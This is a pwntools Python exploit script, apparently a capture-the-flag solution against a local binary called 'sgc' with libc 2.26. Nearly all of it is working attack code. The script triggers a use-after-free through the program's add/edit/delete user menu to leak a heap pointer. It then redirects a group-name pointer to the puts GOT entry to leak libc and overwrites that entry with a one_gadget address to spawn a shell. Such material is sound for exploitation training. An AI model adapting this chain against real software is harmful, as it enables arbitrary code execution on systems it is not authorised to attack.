#encoding =utf-8
from pwn import *
import os

context.arch = 'amd64'
#context.log_level='debug'

io=process('LD_PRELOAD=./libc-2.26.so ./sgc',shell=True)
#io=process('./sgc')
libc=ELF('./libc-2.26.so')
#libc= ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf =ELF('./sgc')

def memu(index):
    io.recvuntil('Action: ')
    io.sendline(str(index))

def add_user(name,group,age):
    memu(0)
    io.recvuntil('name: ')
    io.sendline(name)
    io.recvuntil('group: ')
    io.sendline(group)
    io.recvuntil('age: ')
    io.sendline(str(age))

def display_group(gname):
    memu(1)
    io.recvuntil('Enter group name: ')
    io.sendline(gname)

def display_user(index):
    memu(2)
    io.recvuntil('Enter index: ')
    io.sendline(str(index))

def edit_group(index,choose,newGname):
    memu(3)
    io.recvuntil('Enter index: ')
    io.sendline(str(index))
    io.recvuntil('(y/n): ')
    io.sendline(choose)
    io.sendline(newGname)

def delete_user(index):
    memu(4)
    io.recvuntil('Enter index: ')
    io.sendline(str(index))

def print_gname():
    io.recvuntil('Group: ')
    gname = io.recvuntil('\n',drop=True)
    print 'group name is ',gname
    return gname  

if __name__ == '__main__':
    pause()
    add_user('xxx','group1',10)#user0
    add_user('yyy','group2',10)#user1
    edit_group(0,'y','group2')
    #display_group('group2')
    pause()
    delete_user(1)#now group2 and 'group1' will be deleted
    pause()
    display_user(0)
    #we can leak heap  1.groupname 
    #heap = u64(print_gname().ljust(8,'\x00'))
    io.recvuntil('Group: ')
    gname = io.recvuntil('\n',drop=True)
    heap = u64(gname.ljust(8,'\x00'))
    print 'heap = ',hex(heap) 
    pause()

    #now if we create a new user
    #add_user('group2','group2',10)
    #new user 0,now user 1.groupname  -> user 0.groupname
    # fastbin[0]: 0xe491c0 --> 0xe491a0 --> 0xe49140 --> 0xe49120 --> 0xe49160 --> 0x0
    #  groupname --> struct group -> name --> struct user
    add_user('k'*24,'group3',10)#new user 1
    add_user('l'*24,'group3',10) #user 2
    pause()
    print hex(elf.got['puts'])
    #edit_group(0,'y','k'*24)
     
    payload = p64(0)+p64(elf.got['puts'])+p64(elf.got['puts'])
    edit_group(0,'y',payload)
    print '[!]debug'
    pause()
    #we need to leak libc
    display_user(2)
    io.recvuntil('Group: ')
    glibc = io.recvuntil('\n',drop=True)
    puts_got = u64(glibc.ljust(8,'\x00'))
    print 'puts_got = ',hex(puts_got)
    pause()
    #one_gadget = 0x4526a+ puts_got-libc.symbols['puts']
    one_gadget = 0x47c9a+ puts_got-libc.symbols['puts']
    edit_group(2,'y',p64(one_gadget))
    pause()
    #delete_user(2)
    io.interactive()
    #pause()
    #edit_group(2,'y',p64(elf.got['puts']))
    #pause()
    #io.recv()
    #io.sendline('5')
